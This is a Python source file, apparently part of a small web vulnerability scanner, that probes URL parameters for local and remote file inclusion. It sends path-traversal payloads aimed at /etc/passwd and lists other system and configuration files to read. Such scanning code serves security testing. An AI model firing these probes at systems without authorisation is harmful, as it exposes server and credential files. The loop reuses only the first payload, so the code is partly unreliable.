from Helper import *
class FileInclusion():
	"""doc string fot the class"""
	#liad note: url should be like : http://abcs.com/somepage.php?page=
	def __init__(self,urls,se):
		self.s = se
		self.urls = urls
		self.the_addr = 'http://wvstest.weebly.com'
		self.rfi_text = 'this is special text to test the rfi vulnerability!!!'
		self.lfi_string = ['/../../../../../../../../../../etc/passwd','/../../../../../../../../../../etc/passwd%00']
		self.lfi_links = []
		self.rfi_links = []


	def checkRFI(self,url):#url without last parameter
		"""
		check if rfi exist in the givven url
		"""
		urlAddr = url.padGetParameters(self.the_addr)
		ans = self.s.get(urlAddr)
		if self.rfi_text in ans.text:
			return urlAddr
		return False


	def checkLFI(self,url):
		"""
		check if rfi exist in the given url
		more linux:

		/etc/group
		/etc/hosts
		/etc/motd
		/etc/issue
		/etc/mysql/my.cnf
		/proc/self/environ
		/proc/version
		/proc/cmdline
		(need to ask dor if require) 
		
		apache:

		/etc/apache2/apache2.conf
		/usr/local/etc/apache2/httpd.conf
		/etc/httpd/conf/httpd.conf
		"""
		for lfi in self.lfi_string:
			urlAddr = url.padGetParameters(self.lfi_string[0])
			ans = self.s.get(urlAddr) #liad note: find the linux/unix based servers
			if not notFound(ans) and 'root:' in ans.text:
				return urlAddr
		return False

	def checkLRFI(self):
		"""
		takes the urls and checks each link.
		if link found ad vulnerable its added to the links list.
		"""
		for i in self.urls:
			url = Link(i)
			if url.numOfParameters()>0:
				rfi = self.checkRFI(url)
				print "check vuln in:"+i
				if rfi:
					self.rfi_links.append(rfi)
				lfi = self.checkLFI(url)
				if lfi:
					self.lfi_links.append(lfi)
		return (self.lfi_links,self.rfi_links)
		